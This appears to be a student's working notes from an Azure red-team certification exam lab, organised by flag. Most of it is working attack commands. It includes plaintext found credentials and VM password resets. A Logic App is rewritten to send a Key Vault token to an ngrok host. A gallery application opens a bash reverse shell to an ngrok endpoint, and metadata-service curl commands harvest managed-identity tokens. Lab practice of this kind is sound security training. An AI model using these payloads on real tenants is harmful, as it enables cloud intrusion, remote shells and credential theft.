# AzRTE Exam

## Flag 1

We begin with one user which has access to two storage accounts

Privileges :

- Azure :

```txt
=================================================================
🔍 SCANNING SUBSCRIPTION: 84ee4289-c90a-4af0-b16e-57e147947286
=================================================================
🟠 SENSITIVE ACCESS DETECTED
🎯 Resource Name:   azrteexam02fedb58
📦 Resource Type:   Microsoft.Storage/storageAccounts
📍 Resource ID:     /subscriptions/84ee4289-c90a-4af0-b16e-57e147947286/resourceGroups/azrte-exam-rg-02fedb58/providers/Microsoft.Storage/storageAccounts/azrteexam02fedb58

   ⚠️ TRIGGERED SENSITIVE RULES:
      - Rule:    */action
        → Microsoft.Storage/storageAccounts/blobServices/generateUserDelegationKey/action

      - Rule:    Microsoft.Storage/storageAccounts/blobServices/containers/blobs/read
        → Microsoft.Storage/storageAccounts/blobServices/containers/blobs/read

-----------------------------------------------------------------
=================================================================
🚨 Scan Complete. Scanned 2 resources. Found vulnerabilities on 1 resources.
```

Entra :

```txt
Scanning Transitive Role Assignments for Vulnerabilities...
=================================================================
✅ No transitive role assignments found.

Scanning Owned Objects for Vulnerabilities...
=================================================================
✅ No owned objects found.

Scanning Microsoft Graph API Permissions (via token claims)...
=================================================================
✅ No sensitive Microsoft Graph permissions found in token.
```

Found creds :

```txt
exam_second_user_02fedb58 5frt!H!Br%aoxiRn

/servicePrincipals/5ce4306a-f9f1-4b87-b7b2-3e9bbe531f84 OHs8Q~HxqCF2c8IAGZEVcx4r9f4mMVzDHLdC5ax~
```

## exam_second_user_02fedb58

Azure :

```txt
Resolving authenticated identity...
➔ Logged in as User (exam_second_user_02fedb58@azure.training.hacktricks.xyz)

No Azure Subscriptions found for this identity.
```

Entra :

```txt
Resolving authenticated identity...
➔ Logged in as User (exam_second_user_02fedb58@azure.training.hacktricks.xyz)
➔ Object ID: 0d248977-01d2-418f-a998-cbefb5d28e3b
Acquiring Microsoft Graph access token...

Scanning Transitive Role Assignments for Vulnerabilities...
=================================================================
✅ No transitive role assignments found.

Scanning Owned Objects for Vulnerabilities...
=================================================================
✅ No owned objects found.

Scanning Microsoft Graph API Permissions (via token claims)...
=================================================================
✅ No sensitive Microsoft Graph permissions found in token.
```

Can add user to specific group:

```
az ad group member list -g "9f6cf788-4999-4132-89ab-33d74c493cb0"
az ad group member add -g "9f6cf788-4999-4132-89ab-33d74c493cb0" --member-id "2958a3f6-98b1-491f-97c3-0c115005e7b3"
```

All KV names found :

- flag-exam1-02fedb58f95e
- flag-exam2-02fedb58f95e
- flag-exam3-02fedb58f95e

AVD token

```
# Management


# KV
```

FLAG 1 OK

## Flag 2

```sh
az vm run-command invoke \
  --resource-group "azrte-exam-rg-02fedb58" \
  --name "examdesktop-02fedb58" \
  --command-id RunShellScript \
  --scripts 'whoami'

az vm user update \
  --resource-group "azrte-exam-rg-02fedb58" \
  --name "examdesktop-02fedb58" \
  --username HacktricksUsername \
  --password '!Password123'


```

6.tcp.eu.ngrok.io:19225

logic workflow :

PUT https://management.azure.com/subscriptions/34adfa4f-cedf-4dc0-ba29-b6d1a69ab345/resourceGroups/test-resource-group/providers/Microsoft.Logic/workflows/test-workflow?api-version=2019-05-01
w

```sh

az rest --method GET \
    --url "https://management.azure.com/subscriptions/84ee4289-c90a-4af0-b16e-57e147947286/resourceGroups/azrte-exam-rg-02fedb58/providers/Microsoft.Logic/workflows/examlogic-02fedb58?api-version=2019-05-01"

az rest --method PUT \
    --url "https://management.azure.com/subscriptions/84ee4289-c90a-4af0-b16e-57e147947286/resourceGroups/azrte-exam-rg-02fedb58/providers/Microsoft.Logic/workflows/examlogic-02fedb58?api-version=2019-05-01" \
    --headers 'Content-Type=application/json' \
    --body '{
        "properties": {
            "definition": {
                "$schema": "https://schema.management.azure.com/providers/Microsoft.Logic/schemas/2016-06-01/workflowDefinition.json#",
                "contentVersion": "1.0.0.0",
                "parameters": {},
                "triggers": {
                    "manual": {
                        "type": "Request",
                        "kind": "Http",
                        "inputs": {
                            "schema": {}
                        }
                    }
                },
                "actions": {
                    "GetSecret": {
                        "type": "Http",
                        "inputs": {
                            "method": "GET",
                            "uri": "https://defender-avenge-unnoticed.ngrok-free.dev",
                            "authentication": {
                                "type": "ManagedServiceIdentity",
                                "audience": "https://vault.azure.net/",
                                "identity": "/subscriptions/84ee4289-c90a-4af0-b16e-57e147947286/resourceGroups/azrte-exam-rg-02fedb58/providers/Microsoft.ManagedIdentity/userAssignedIdentities/examlogic-uai-02fedb58"
                            }
                        }
                    },
                    "Respond": {
                        "type": "Response",
                        "runAfter": {
                            "GetSecret": [
                                "Succeeded"
                            ]
                        },
                        "inputs": {
                            "statusCode": 200,
                            "body": "@body(\"GetSecret\")"
                        }
                    }
                },
                "outputs": {}
            },
            "parameters": {}
        },
        "location": "centralus"
    }'
```

```sh
az rest --method POST --url "https://management.azure.com/subscriptions/84ee4289-c90a-4af0-b16e-57e147947286/resourceGroups/azrte-exam-rg-02fedb58/providers/Microsoft.Logic/workflows/examlogic-02fedb58/triggers/manual/listCallbackUrl?api-version=2019-05-01" --query "value" -o tsv

curl -X POST -H "Authorization: Bearer $MGT" "https://management.azure.com/subscriptions/84ee4289-c90a-4af0-b16e-57e147947286/resourceGroups/azrte-exam-rg-02fedb58/providers/Microsoft.Logic/workflows/examlogic-02fedb58/triggers/manual/listCallbackUrl?api-version=2019-05-01"

curl -X POST "https://prod-00.centralus.logic.azure.com:443/workflows/c8d0577542844992b7dd179347cadf66/triggers/manual/paths/invoke?api-version=2019-05-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=yAiPmzP91SZJtCGVkKp2cbEK240m5j80551EU3iEy7g"
```

## Flag 3

```sh
az vm user update \
  --resource-group azrte-exam-rg-02fedb58 \
  --name exam-vm-access \
  --username HacktricksUsername \
  --password '!Password123'


POST https://management.azure.com/subscriptions/84ee4289-c90a-4af0-b16e-57e147947286/resourceGroups/azrte-exam-rg-02fedb58/providers/Microsoft.LabServices/labs/testlab/virtualMachines/template/resetPassword?api-version=2023-06-07

```

Use gallery:

```sh
az rest --method POST --url "https://examstoragetovm02fedb58.blob.core.windows.net/?comp=list"

az sig create --resource-group azrte-exam-rg-02fedb58 \
   --gallery-name myGallery --location "centralus"

az rest --method PUT --url "https://management.azure.com/subscriptions/84ee4289-c90a-4af0-b16e-57e147947286/resourceGroups/azrte-exam-rg-02fedb58/providers/Microsoft.Compute/galleries/myGallery/?api-version=2024-03-03" \
    --headers 'Content-Type=application/json' \
    --body '{"location": "centralus"}'


# Create application container
az sig gallery-application create \
    --application-name myReverseShellApp \
    --gallery-name myGallery \
    --resource-group azrte-exam-rg-02fedb58 \
    --os-type Linux \
    --location "centralus"

az rest --method PUT --url "https://management.azure.com/subscriptions/84ee4289-c90a-4af0-b16e-57e147947286/resourceGroups/azrte-exam-rg-02fedb58/providers/Microsoft.Compute/galleries/myGallery/applications/myReverseShellApp/?api-version=2024-03-03" \
    --headers 'Content-Type=application/json' \
    --body '{"properties": {
            "supportedOSType": "Linux"
        },
        "location": "centralus"
    }'

# Create app version with the rev shell
## In Package file link just add any link to a blobl storage file
az sig gallery-application version create \
   --version-name 1.0.2 \
   --application-name myReverseShellApp \
   --gallery-name myGallery \
   --location "centralus" \
   --resource-group azrte-exam-rg-02fedb58 \
   --package-file-link "https://examstoragetovm02fedb58.blob.core.windows.net/package-container/asd.txt?sp=r&st=2024-12-04T01:10:42Z&se=2024-12-04T09:10:42Z&spr=https&sv=2022-11-02&sr=b&sig=eMQFqvCj4XLLPdHvnyqgF%2B1xqdzN8m7oVtyOOkMsCEY%3D" \
   --install-command "bash -c 'bash -i >& /dev/tcp/4.tcp.eu.ngrok.io/16560 0>&1'" \
   --remove-command "bash -c 'bash -i >& /dev/tcp/4.tcp.eu.ngrok.io/16560 0>&1'" \
   --update-command "bash -c 'bash -i >& /dev/tcp/4.tcp.eu.ngrok.io/16560 0>&1'"

az rest --method PUT --url "https://management.azure.com/subscriptions/84ee4289-c90a-4af0-b16e-57e147947286/resourceGroups/azrte-exam-rg-02fedb58/providers/Microsoft.Compute/galleries/myGallery/applications/myReverseShellApp/versions/1.0.4?api-version=2024-03-03" \
    --headers 'Content-Type=application/json' \
    --body '{
        "properties": {
            "publishingProfile": {
                "source": {
                    "mediaLink": "https://examstoragetovm02fedb58.blob.core.windows.net/package-container/package.txt?sv=2025-07-05&spr=https&st=2026-04-23T20%3A47%3A19Z&se=2026-04-24T20%3A47%3A19Z&sr=c&sp=racwdxl&sig=lWUYrASaWN7KDerQWelzP5HiIG12pTc3gLoZQMqOpM0%3D"
                },
                "manageActions": {
                    "install": "bash -c \"bash -i >& /dev/tcp/4.tcp.eu.ngrok.io/16560 0>&1\"",
                    "update": "bash -c \"bash -i >& /dev/tcp/4.tcp.eu.ngrok.io/16560 0>&1\"",
                    "remove": "bash -c \"bash -i >& /dev/tcp/4.tcp.eu.ngrok.io/16560 0>&1\""
                }
            }
        },
        "location": "centralus"
    }'


az rest --method GET --url "https://management.azure.com/subscriptions/84ee4289-c90a-4af0-b16e-57e147947286/resourceGroups/azrte-exam-rg-02fedb58/providers/Microsoft.Compute/galleries/myGallery/applications/myReverseShellApp/versions/?api-version=2024-03-03"

# Install the app in a VM to execute the rev shell
## Use the ID given in the previous output
az vm application set \
   --resource-group azrte-exam-rg-02fedb58 \
   --name exam-vm-access \
   --app-version-ids /subscriptions/84ee4289-c90a-4af0-b16e-57e147947286/resourceGroups/azrte-exam-rg-02fedb58/providers/Microsoft.Compute/galleries/myGallery/applications/myReverseShellApp/versions/1.0.3 \
   --treat-deployment-as-failure true

az rest --method PUT --url "https://management.azure.com/subscriptions/84ee4289-c90a-4af0-b16e-57e147947286/resourceGroups/azrte-exam-rg-02fedb58/providers/Microsoft.Compute/virtualMachines/exam-vm-access?api-version=2025-04-01" \
    --headers 'Content-Type=application/json' \
    --body '{
        "properties": {
            "applicationProfile": {
                "galleryApplications": [
                    {
                        "packageReferenceId": "/subscriptions/84ee4289-c90a-4af0-b16e-57e147947286/resourceGroups/azrte-exam-rg-02fedb58/providers/Microsoft.Compute/galleries/myGallery/applications/myReverseShellApp/versions/1.0.4",
                        "order": 1,
                        "treatFailureAsDeploymentFailure": true
                    }
                ]
            }
        },
        "location":"centralus"
    }'


CLIENT_ID="6eacec61-0a7d-48a4-9b74-25abf3275bf3"; HEADER="Metadata:true"; URL="http://169.254.169.254/metadata"; API_VERSION="2021-12-13"; curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://vault.azure.net/&client_id=$CLIENT_ID"
HEADER="Metadata:true"; URL="http://169.254.169.254/metadata"; API_VERSION="2021-12-13"; curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://vault.azure.net/"

CLIENT_ID="6eacec61-0a7d-48a4-9b74-25abf3275bf3"; HEADER="Metadata:true"; URL="http://169.254.169.254/metadata"; API_VERSION="2021-12-13"; curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://graph.microsoft.com/&client_id=$CLIENT_ID"
HEADER="Metadata:true"; URL="http://169.254.169.254/metadata"; API_VERSION="2021-12-13"; curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://graph.microsoft.com/"
```

identities

```
[
  {
    "clientId": "74cd3ee3-b759-42da-87a2-c8303df864af",
    "id": "/subscriptions/84ee4289-c90a-4af0-b16e-57e147947286/resourcegroups/azrte-exam-rg-02fedb58/providers/Microsoft.ManagedIdentity/userAssignedIdentities/examdesktop-uai-02fedb58",
    "isolationScope": "None",
    "location": "centralus",
    "name": "examdesktop-uai-02fedb58",
    "principalId": "484633bd-b35d-45b9-8baf-6eae4187ab42",
    "resourceGroup": "azrte-exam-rg-02fedb58",
    "systemData": null,
    "tags": {},
    "tenantId": "fdd066e1-ee37-49bc-b08f-d0e152119b04",
    "type": "Microsoft.ManagedIdentity/userAssignedIdentities"
  },
  {
    "clientId": "2e62dd70-28fe-443a-9d0a-27647f59a14f",
    "id": "/subscriptions/84ee4289-c90a-4af0-b16e-57e147947286/resourcegroups/azrte-exam-rg-02fedb58/providers/Microsoft.ManagedIdentity/userAssignedIdentities/examlogic-uai-02fedb58",
    "isolationScope": "None",
    "location": "centralus",
    "name": "examlogic-uai-02fedb58",
    "principalId": "a3b0aa39-d1e3-4f6e-8eea-37bfa123196c",
    "resourceGroup": "azrte-exam-rg-02fedb58",
    "systemData": null,
    "tags": {},
    "tenantId": "fdd066e1-ee37-49bc-b08f-d0e152119b04",
    "type": "Microsoft.ManagedIdentity/userAssignedIdentities"
  },
  {
    "clientId": "6eacec61-0a7d-48a4-9b74-25abf3275bf3",
    "id": "/subscriptions/84ee4289-c90a-4af0-b16e-57e147947286/resourcegroups/azrte-exam-rg-02fedb58/providers/Microsoft.ManagedIdentity/userAssignedIdentities/exam-vm-identity",
    "isolationScope": "None",
    "location": "centralus",
    "name": "exam-vm-identity",
    "principalId": "54562055-d89a-41b9-bc8c-d626836e38a2",
    "resourceGroup": "azrte-exam-rg-02fedb58",
    "systemData": null,
    "tags": {},
    "tenantId": "fdd066e1-ee37-49bc-b08f-d0e152119b04",
    "type": "Microsoft.ManagedIdentity/userAssignedIdentities"
  }
]

```
